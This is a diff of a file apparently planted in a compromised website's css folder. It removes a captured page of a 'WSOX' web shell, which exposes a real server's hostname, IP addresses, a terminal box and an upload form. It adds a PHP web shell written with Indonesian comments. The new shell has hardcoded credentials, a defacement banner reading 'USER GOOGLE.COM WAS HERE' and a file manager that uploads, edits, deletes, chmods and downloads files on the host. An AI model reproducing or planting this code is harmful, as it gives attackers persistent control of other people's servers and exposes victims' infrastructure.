@@ -1,25 +1,380 @@
-<center><a href='?logout'>CABUT</a></center><html><head><meta http-equiv='Content-Type' content='text/html; charset=Windows-1251'><title>marmaraygm.com.tr - WSOX ENC 6.3.1</title>
-		<style>body{background-color:#444;color:#e1e1e1;}body,td,th{font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1;}table.info{color:#fff;background-color:#222;}span,h1,a{color: #df5 !important;}span{font-weight: bolder;}span.wfw{font-weight:normal;}h1{border-left:5px solid #df5;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px;}div.content{padding: 5px;margin-left:5px;background-color:#333;}a{text-decoration:none;}a:hover{text-decoration:underline;}.ml1{border:1px solid #444;padding:5px;margin:0;overflow: auto;}.bigarea{width:100%;height:300px;}input,textarea,select{margin:0;color:#fff;background-color:#555;border:1px solid #df5; font: 9pt Monospace,'Courier New';}form{margin:0px;}#toolsTbl{text-align:center;}.toolsInp{width:500px}.main th{text-align:left;background-color:#5e5e5e;}.main tr:hover{background-color:#5e5e5e}.l1{background-color:#444}.l2{background-color:#333}pre{font-family:Courier,Monospace;}</style>
-<script>
-var c_ = '/ubzr/znezn/choyvp_ugzy/pff/';
-var a_ = ''
-var ch_ = 'Windows-1251';
-var p_ = '';
-var x_ = '';
-var s_ = '';
-var d = document;
-function set(a,c,p,x,s,ch){if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;if(p!=null)d.mf.p.value=p;else d.mf.p.value=p_;if(x!=null)d.mf.x.value=x;else d.mf.x.value=x_;if(s!=null)d.mf.s.value=s;else d.mf.s.value=s_;if(ch!=null)d.mf.ch.value=ch;else d.mf.ch.value=ch_;}function g(a,c,p,x,s,ch){set(a,c,p,x,s,ch);d.mf.submit();}function utoa(str){return window.btoa(unescape(encodeURIComponent(str)));}function atou(str){return decodeURIComponent(escape(window.atob(str)));}function rot13(str){var input='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; var output='NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'; var index=x=> input.indexOf(x); var translate=x=> index(x) > -1 ? output[index(x)] : x; return str.split('').map(translate).join('');}var cvis=false;function show(){if(!cvis){document.getElementById('bat').innerHTML='Links';document.getElementById('cwd').style.display='inline';document.getElementById('links').style.display='none';cvis=true;}else{document.getElementById('bat').innerHTML='Text';document.getElementById('cwd').style.display='none';document.getElementById('links').style.display='inline';cvis=false;}}
-</script>
-</head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
-<form method=post name=mf style='display:none;'>
-<input type=hidden name=a>
-<input type=hidden name=c>
-<input type=hidden name=p>
-<input type=hidden name=x>
-<input type=hidden name=s>
-<input type=hidden name=ch>
-</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux ni-bunny.guzelhosting.com 3.10.0-962.3.2.lve1.5.66.el7.x86_64 #1 SMP Mon Feb 7 15:53:01 UTC 2022 x86_64</nobr><br>5.6.40 <span>Safe mode:</span> <font color=green><b>OFF</b></font> <span>Datetime:</span> 2024-10-19 10:09:53<br>1005.50 GB <span>Free:</span> 60.34 GB (6%)<br><span id="links" class="wfw"><a href='#' onclick='g("fm","/","","")'>/</a><a href='#' onclick='g("fm","/ubzr/","","")'>home/</a><a href='#' onclick='g("fm","/ubzr/znezn/","","")'>marma/</a><a href='#' onclick='g("fm","/ubzr/znezn/choyvp_ugzy/","","")'>public_html/</a><a href='#' onclick='g("fm","/ubzr/znezn/choyvp_ugzy/pff/","","")'>css/</a> <font color=#25ff00>drwxr-xr-x</font> <a href=# onclick="g('fm','/ubzr/znezn/choyvp_ugzy','','','')">[ root ]</a> <a href=# onclick="g('fm','/ubzr/znezn/choyvp_ugzy/pff','','','')">[ home ]</a></span><span id="cwd" style="display: none;" class="wfw"><input size=50 type=text value="/home/marma/public_html/css/"></span> <a href=# onclick="show();"><font color=#fff id="bat">Text</font></a><br></td><td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset"><option value="UTF-8" >UTF-8</option><option value="Windows-1251" selected>Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></optgroup></select><br><span>Server IP:</span><br>31.192.214.109<br><span>Client IP:</span><br>27.116.61.71</nobr></td></tr></table><table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr><th width="50%">[ <a href="#" onclick="g('fm',null,'','','')">Files</a> ]</th><th width="50%">[ <a href="#" onclick="g('Logout',null,'','','')">Logout</a> ]</th></tr></table><div style="margin:5"><h1>File manager</h1><div class=content><script>p_=x_=s_="";</script><script>function sa(){for(i=0;i<d.files.elements.length;i++)if(d.files.elements[i].type=='checkbox')d.files.elements[i].checked=d.files.elements[0].checked;}</script><table width='100%' class='main' cellspacing='0' cellpadding='2'><form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th width='40%'><a href='#' onclick='g("fm",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("fm",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("fm",null,"s_modify_0")'>Modify</a></th><th><a href='#' onclick='g("fm",null,"s_perms_0")'>Permissions</a></th><th width='200px'>Actions</th></tr><tr><td><input type=checkbox name="f[]" value="." class=chkbx></td><td><a href=# onclick="g('fm','/ubzr/znezn/choyvp_ugzy/pff/.');" ><b>[ . ]</b></a></td><td>dir</td><td>2024-10-10 06:47:38</td><td><a href=# onclick="g('ft',null,'.','chmod')"><font color=#25ff00>drwxr-xr-x</font></td><td><a href="#" onclick="g('ft',null,'.', 'rename')">Rename</a> <a href="#" onclick="g('ft',null,'.', 'touch')">Touch</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('fm','/ubzr/znezn/choyvp_ugzy/pff/..');" ><b>[ .. ]</b></a></td><td>dir</td><td>2024-06-22 20:45:56</td><td><a href=# onclick="g('ft',null,'..','chmod')"><font color=#25ff00>drwxr-x---</font></td><td><a href="#" onclick="g('ft',null,'..', 'rename')">Rename</a> <a href="#" onclick="g('ft',null,'..', 'touch')">Touch</a></td></tr><tr><td><input type=checkbox name="f[]" value="pff.pff" class=chkbx></td><td><a href=# onclick="g('ft',null,'pff.pff', 'view')">css.css</a></td><td>13.07 KB</td><td>2015-01-28 16:01:36</td><td><a href=# onclick="g('ft',null,'pff.pff','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('ft',null,'pff.pff', 'rename')">Rename</a> <a href="#" onclick="g('ft',null,'pff.pff', 'touch')">Touch</a> <a href="#" onclick="g('ft',null,'pff.pff', 'edit')">Edit</a> <a href="#" onclick="g('ft',null,'pff.pff', 'download')">Download</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="pff.ene" class=chkbx></td><td><a href=# onclick="g('ft',null,'pff.ene', 'view')">css.rar</a></td><td>3.67 KB</td><td>2015-01-19 16:22:40</td><td><a href=# onclick="g('ft',null,'pff.ene','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('ft',null,'pff.ene', 'rename')">Rename</a> <a href="#" onclick="g('ft',null,'pff.ene', 'touch')">Touch</a> <a href="#" onclick="g('ft',null,'pff.ene', 'edit')">Edit</a> <a href="#" onclick="g('ft',null,'pff.ene', 'download')">Download</a></td></tr><tr><td><input type=checkbox name="f[]" value="vzhar.cuc" class=chkbx></td><td><a href=# onclick="g('ft',null,'vzhar.cuc', 'view')">imune.php</a></td><td>22.30 KB</td><td>2024-10-10 06:48:18</td><td><a href=# onclick="g('ft',null,'vzhar.cuc','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('ft',null,'vzhar.cuc', 'rename')">Rename</a> <a href="#" onclick="g('ft',null,'vzhar.cuc', 'touch')">Touch</a> <a href="#" onclick="g('ft',null,'vzhar.cuc', 'edit')">Edit</a> <a href="#" onclick="g('ft',null,'vzhar.cuc', 'download')">Download</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="fglyr6.pff" class=chkbx></td><td><a href=# onclick="g('ft',null,'fglyr6.pff', 'view')">style6.css</a></td><td>3.87 KB</td><td>2015-01-19 16:22:40</td><td><a href=# onclick="g('ft',null,'fglyr6.pff','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('ft',null,'fglyr6.pff', 'rename')">Rename</a> <a href="#" onclick="g('ft',null,'fglyr6.pff', 'touch')">Touch</a> <a href="#" onclick="g('ft',null,'fglyr6.pff', 'edit')">Edit</a> <a href="#" onclick="g('ft',null,'fglyr6.pff', 'download')">Download</a></td></tr><tr><td colspan=7>
-		<input type=hidden name=a value='fm'>
-		<input type=hidden name=c value='/ubzr/znezn/choyvp_ugzy/pff/'>
-		<input type=hidden name=ch value='Windows-1251'>
-		<select name='p'><option value='delete'>Delete</option></select>&nbsp;<input type='submit' value='>>'></td></tr></form></table></div></div><table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'><tr><td><form onsubmit='g(null,rot13(this.c.value),"");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/home/marma/public_html/css/'><input type=submit value='>>'></form></td><td><form onsubmit="g('ft',null,rot13(this.f.value));return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td></tr><tr><td><form onsubmit="g('fm',null,'mkdir',rot13(this.d.value));return false;"><span>Make dir:</span> <font color='green'>(Writeable)</font><br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td><td><form onsubmit="g('ft',null,rot13(this.f.value),'mkfile');return false;"><span>Make file:</span> <font color='green'>(Writeable)</font><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td></tr><tr><td><form onsubmit="g('ce',null,utoa(this.c.value));return false;"></a></form><form method=post ><span>Terminal:</span><br><input class='toolsInp' type=text name=command value='' autocomplete='off'><input type=submit value='>>' name='subcmd'></form></td><span></td><td><form method='post' ENCTYPE='multipart/form-data'><input type=hidden name=a value='fm'><input type=hidden name=c value='/ubzr/znezn/choyvp_ugzy/pff/'><input type=hidden name=p value='uploadFile'><input type=hidden name=ch value='Windows-1251'><span>Upload file:</span> <font color='green'>(Writeable)</font><br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td></tr></table></div></body></html>
+                                <?php
+session_start(); // Mulai sesi
+
+// Daftar pengguna yang valid (gantilah ini dengan pengguna yang sesungguhnya)
+$validUsers = array(
+    'user0' => 'pass0',
+    'userwin' => 'passwin',
+);
+
+// Fungsi untuk memeriksa otentikasi pengguna
+function cekOtentikasi($username, $password) {
+    global $validUsers;
+    if (isset($validUsers[$username]) && $validUsers[$username] === $password) {
+        return true; // Otentikasi berhasil
+    }
+    return false; // Otentikasi gagal
+}
+
+// Proses login jika form dikirimkan
+if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['login'])) {
+    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
+    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
+
+    if (cekOtentikasi($username, $password)) {
+        // Otentikasi berhasil, atur sesi
+        $_SESSION['loggedin'] = true;
+        $_SESSION['username'] = $username;
+    } else {
+        // Otentikasi gagal, tampilkan pesan error
+        $pesanError = "Username atau Password salah.";
+    }
+}
+
+// Logout jika diperlukan
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ?'); // Redirect ke halaman login setelah logout
+    exit;
+}
+
+// Cek apakah pengguna sudah login, jika tidak, tampilkan form login
+if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+<head>
+<style>
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.flag {
+    width: 200px;
+    height: 100px;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+
+}
+
+.stripe {
+    flex: 1;
+    width: 100%;
+color:orange;
+font-size:25px;
+
+}
+
+.stripe-black {
+    background-color: #000; /* Warna hitam pada bendera Palestina */
+
+}
+
+.stripe-white {
+    background-color: #fff; /* Warna putih pada bendera Palestina */
+}
+
+.stripe-green {
+    background-color: #009900; /* Warna hijau pada bendera Palestina */
+}
+
+
+.triangle-left{
+      width: 0;
+    height: 0;
+    border-top: 50px solid transparent;
+    border-bottom: 50px solid transparent;
+    border-left: 65px solid #FF0000;
+    position: absolute;
+    left: 0;
+    z-index: 2;
+}
+.iflag { width: 200px; height: 100px; position: relative;bottom:100px;left:250px; display: flex; flex-direction: column; background: linear-gradient(to bottom, red 50%, white 50%); border: 1px solid black; color: white; /* Mengatur warna teks agar terlihat di atas latar belakang */ padding: 10px 20px; /* Sesuaikan ukuran padding sesuai kebutuhan Anda */ }
+}
+
+</style>
+</head><title>USER GOOGLE.COM WAS HERE</title>
+<body><div>
+<?php if (isset($pesanError)) echo "<p>$pesanError</p>";echo"<p>"; ?>
+<form method="post">
+    <div class="flag">
+        <input class="stripe stripe-black" value="" name="username"> <input class="stripe stripe-white" value="" name="password"> <input readonly class="stripe stripe-green"> <div class="triangle-left"></div></div><input type="submit" class="iflag" name="login" value=""> </form>
+</body>
+<center>
+<div  id="zal">
+    <script>
+  var i=0,text;
+  text = " USER GOOGLE.COM WAS HERE ..."
+
+  function ketik() {
+    if(i<text.length){
+      document.getElementById("zal").innerHTML += text.charAt(i);
+      i++;
+      setTimeout(ketik,100);
+    }
+  }
+  ketik();
+</script></div></center>
+</html>
+   
+
+   
+    <?php
+    exit; // Hentikan eksekusi jika pengguna belum login
+}
+
+
+
+$base_dir = __DIR__; // Direktori root dari file manager
+$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '';
+$dir_path = realpath($base_dir . '/' . $current_dir);
+
+// Validasi path
+if (!$dir_path || strpos($dir_path, $base_dir) !== 0) {
+    die('Akses tidak diizinkan');
+}
+
+// Fungsi untuk menampilkan ukuran file
+function format_size($size) {
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $unit = 0;
+    while ($size >= 1024 && $unit < 4) {
+        $size /= 1024;
+        $unit++;
+    }
+    return round($size, 2) . ' ' . $units[$unit];
+}
+
+// Fungsi untuk menampilkan file dan direktori
+function list_files($dir_path, $current_dir) {
+    $files = array_diff(scandir($dir_path), ['.', '..']);
+    foreach ($files as $file) {
+        $file_path = $dir_path . '/' . $file;
+        $is_dir = is_dir($file_path);
+        $file_url = $current_dir . '/' . $file;
+        echo '<tr>';
+        echo '<td>' . ($is_dir ? '<i class="fas fa-folder"></i> ' : '<i class="fas fa-file"></i> ') . '<a href="?dir=' . urlencode($file_url) . '">' . $file . '</a></td>';
+        echo '<td>' . ($is_dir ? 'Directory' : 'File') . '</td>';
+        echo '<td>' . ($is_dir ? '-' : format_size(filesize($file_path))) . '</td>';
+        echo '<td>' . substr(sprintf('%o', fileperms($file_path)), -4) . '</td>';
+        echo '<td>';
+        echo '<a href="?dir=' . urlencode($current_dir) . '&action=delete&file=' . urlencode($file) . '">Delete</a> | ';
+        echo '<a href="?dir=' . urlencode($current_dir) . '&action=rename&file=' . urlencode($file) . '">Rename</a> | ';
+        if (!$is_dir) {
+            echo '<a href="?dir=' . urlencode($current_dir) . '&action=download&file=' . urlencode($file) . '">Download</a> | ';
+            echo '<a href="?dir=' . urlencode($current_dir) . '&action=edit&file=' . urlencode($file) . '">Edit</a> | ';
+        }
+        echo '<a href="?dir=' . urlencode($current_dir) . '&action=chmod&file=' . urlencode($file) . '">Chmod</a>';
+        echo '</td>';
+        echo '</tr>';
+    }
+}
+
+// Fungsi untuk menampilkan breadcrumb path
+function display_breadcrumbs($current_dir) {
+    $breadcrumbs = explode('/', $current_dir);
+    $path = '';
+    echo '<a href="?dir=">Root</a> / ';
+    foreach ($breadcrumbs as $crumb) {
+        if ($crumb !== '') {
+            $path .= '/' . $crumb;
+            echo '<a href="?dir=' . urlencode(ltrim($path, '/')) . '">' . $crumb . '</a> / ';
+        }
+    }
+}
+
+// Fungsi untuk menghapus file atau direktori
+if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['file'])) {
+    $file_path = $dir_path . '/' . $_GET['file'];
+    if (is_dir($file_path)) {
+        rmdir($file_path);
+    } else {
+        unlink($file_path);
+    }
+    header('Location: ?dir=' . urlencode($current_dir));
+    exit();
+}
+
+// Fungsi untuk mengganti nama file atau direktori
+if (isset($_POST['rename']) && isset($_POST['newname']) && isset($_POST['file'])) {
+    $old_file = $dir_path . '/' . $_POST['file'];
+    $new_file = $dir_path . '/' . $_POST['newname'];
+    rename($old_file, $new_file);
+    header('Location: ?dir=' . urlencode($current_dir));
+    exit();
+}
+
+// Fungsi untuk mengunduh file
+if (isset($_GET['action']) && $_GET['action'] == 'download' && isset($_GET['file'])) {
+    $file_path = $dir_path . '/' . $_GET['file'];
+    if (file_exists($file_path)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
+        header('Content-Length: ' . filesize($file_path));
+        readfile($file_path);
+        exit();
+    }
+}
+
+// Fungsi untuk mengubah izin (chmod) file atau direktori
+if (isset($_POST['chmod']) && isset($_POST['permissions']) && isset($_POST['file'])) {
+    $file_path = $dir_path . '/' . $_POST['file'];
+    chmod($file_path, octdec($_POST['permissions']));
+    header('Location: ?dir=' . urlencode($current_dir));
+    exit();
+}
+
+// Fungsi untuk mengunggah file
+if (isset($_FILES['file'])) {
+    $upload_file = $dir_path . '/' . basename($_FILES['file']['name']);
+    move_uploaded_file($_FILES['file']['tmp_name'], $upload_file);
+    header('Location: ?dir=' . urlencode($current_dir));
+    exit();
+}
+
+// Fungsi untuk membuat direktori baru
+if (isset($_POST['dirname']) && !empty($_POST['dirname'])) {
+    $new_dir = $dir_path . '/' . $_POST['dirname'];
+    mkdir($new_dir);
+    header('Location: ?dir=' . urlencode($current_dir));
+    exit();
+}
+
+// Fungsi untuk membuat file baru
+if (isset($_POST['filename']) && !empty($_POST['filename'])) {
+    $new_file = $dir_path . '/' . $_POST['filename'];
+    file_put_contents($new_file, '');
+    header('Location: ?dir=' . urlencode($current_dir));
+    exit();
+}
+
+// Fungsi untuk mengedit file
+if (isset($_POST['save']) && isset($_POST['content']) && isset($_POST['file'])) {
+    $file_path = $dir_path . '/' . $_POST['file'];
+    file_put_contents($file_path, $_POST['content']);
+    header('Location: ?dir=' . urlencode($current_dir));
+    exit();
+}
+
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Manager</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        table, th, td {
+            border: 1px solid black;
+        }
+        th, td {
+            padding: 8px;
+            text-align: left;
+        }
+        a {
+            color: blue;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .form-inline {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>File Manager</h1>
+
+    <h1>Selamat datang, <?php echo $_SESSION['username']; ?>!</h1>
+    <a href="?logout">Logout</a>
+    <center>
+        <a href="?">Home</a> 
+        <p>
+<p>
+    <?php display_breadcrumbs($current_dir); ?>
+</p>
+
+<table>
+    <thead>
+        <tr>
+            <th>Name</th>
+            <th>Type</th>
+            <th>Size</th>
+            <th>Permissions</th>
+            <th>Actions</th>
+        </tr>
+    </thead>
+    <tbody>
+        <?php list_files($dir_path, $current_dir); ?>
+    </tbody>
+</table>
+
+<h2>Actions</h2>
+
+<div class="form-inline">
+    <form method="POST" enctype="multipart/form-data">
+        <input type="file" name="file">
+        <button type="submit">Upload File</button>
+    </form>
+
+    <form method="POST">
+        <input type="text" name="dirname" placeholder="Directory Name">
+        <button type="submit">Create Directory</button>
+    </form>
+
+    <form method="POST">
+        <input type="text" name="filename" placeholder="File Name">
+        <button type="submit">Create File</button>
+    </form>
+</div>
+
+<?php if (isset($_GET['action']) && $_GET['action'] == 'rename' && isset($_GET['file'])): ?>
+<h3>Rename File/Directory: <?php echo htmlspecialchars($_GET['file']); ?></h3>
+<form method="POST">
+    <input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['file']); ?>">
+    <input type="text" name="newname" placeholder="New Name">
+    <button type="submit" name="rename">Rename</button>
+</form>
+<?php endif; ?>
+
+<?php if (isset($_GET['action']) && $_GET['action'] == 'chmod' && isset($_GET['file'])): ?>
+<h3>Change Permissions (chmod) for: <?php echo htmlspecialchars($_GET['file']); ?></h3>
+<form method="POST">
+    <input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['file']); ?>">
+    <input type="text" name="permissions" placeholder="e.g. 0755">
+    <button type="submit" name="chmod">Change Permissions</button>
+</form>
+<?php endif; ?>
+
+<?php if (isset($_GET['action']) && $_GET['action'] == 'edit' && isset($_GET['file'])): ?>
+<h3>Edit File: <?php echo htmlspecialchars($_GET['file']); ?></h3>
+<form method="POST">
+    <input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['file']); ?>">
+    <textarea name="content" rows="20" style="width: 100%;"><?php echo htmlspecialchars(file_get_contents($dir_path . '/' . $_GET['file'])); ?></textarea>
+    <button type="submit" name="save">Save Changes</button>
+</form>
+<?php endif; ?>
+
+</body>
+</html>
+ 
+			
